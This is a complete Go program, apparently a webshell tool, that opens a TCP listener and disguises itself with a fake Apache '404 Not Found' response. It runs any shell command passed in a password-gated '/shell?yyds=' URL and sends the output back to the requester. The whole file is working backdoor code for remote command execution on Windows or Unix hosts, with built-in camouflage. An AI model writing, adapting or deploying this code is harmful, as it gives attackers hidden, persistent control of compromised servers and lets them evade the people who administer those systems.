package main

import (
	"bytes"
	"flag"
	"fmt"
	"github.com/axgle/mahonia"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

func getCmdResult(command string)(cmdResult string)  {
	var shellSlice = make([]string,2)
	var decode string
	if runtime.GOOS == "windows"{
		shellSlice[0] = "cmd"
		shellSlice[1] = "/c"
		decode = "gbk"
	}else{
		shellSlice[0] = "/bin/sh"
		shellSlice[1] = "-c"
		decode = "utf-8"
	}
	// 执行命令
	cmd := exec.Command(shellSlice[0],shellSlice[1],command)
	output,err := cmd.Output()
	// 命令结果
	var builder strings.Builder
	if err == nil {
		var dec mahonia.Decoder
		dec = mahonia.NewDecoder(decode)
		_, cdata, _ := dec.Translate(output, true)
		cmdResult = string(cdata)
	}else{
		cmdResult = fmt.Sprintf("'%s' command not found\n",command)
	}
	builder.WriteString(cmdResult)
	cmdResult = builder.String()
	cmdResult = string(bytes.ReplaceAll([]byte(cmdResult),[]byte("\n"),[]byte("</br>")))
	return cmdResult
}



func main() {
	port := flag.Int("p",9991,"端口")
	c := flag.String("c","yyds","webshell密码")
	flag.Parse()

	hostPort := fmt.Sprintf("0.0.0.0:%d",*port)
	server, err := net.Listen("tcp", hostPort)
	if err != nil {
		fmt.Println(err)
	}
	for true {
		var html =`HTTP/1.1 404 Not Found
Content-Length: 198
Content-Type: text/html; charset=utf-8
Date: Wed, 08 Feb 2023 11:40:29 GMT
Server: Apache

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL / was not found on this server.</p>
</body></html>

`
		// 获取客户端链接对象,三次握手,客户端未链接,呈现阻塞
		conn, _ := server.Accept()
		// 接收数据
		data := make([]byte, 1024)
		n, _ := conn.Read(data)
		reqLine := strings.Split(string(data[:n]), "\n")[0]
		path := strings.Split(reqLine, " ")
		if len(path) == 3{
			if strings.HasPrefix(path[1],fmt.Sprintf("/shell?%s=",*c)){
				command := strings.TrimSpace(strings.Split(path[1], "=")[1])
				command = string(bytes.ReplaceAll([]byte(command),[]byte("%20"),[]byte(" ")))
				cmdResult := getCmdResult(command)
				html = fmt.Sprintf(`HTTP/1.1 200 OK
Content-Length: %d
Content-Type: text/html; charset=utf-8

%s`,len(cmdResult),cmdResult)
			}
		}
		conn.Write([]byte(html))
		conn.Close()
	}
}